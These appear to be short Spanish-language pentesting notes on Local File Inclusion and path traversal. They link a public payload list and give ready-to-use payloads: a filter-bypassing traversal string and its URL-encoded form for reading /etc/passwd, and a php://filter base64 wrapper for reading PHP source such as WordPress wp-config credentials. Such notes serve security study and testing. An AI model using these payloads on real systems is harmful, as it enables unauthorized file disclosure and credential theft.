# LFI & Path Traversal

## LFI
- [Paylaods Fuzzing](https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt)
- Ejemplo para bypassear filtros: `....//....//....//....//etc/passwd`
- Encodearlo en URL también sirve: `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`

## como poder ver archivos mediante path traversal
- `php://filter/read=convert.base64-encode/resource=ARCHIVO-PHP`
- Con esto podriamos ver una clave en texto plano en un wordpress, en el wp-config por ejemplo, el phpinfo, etc.
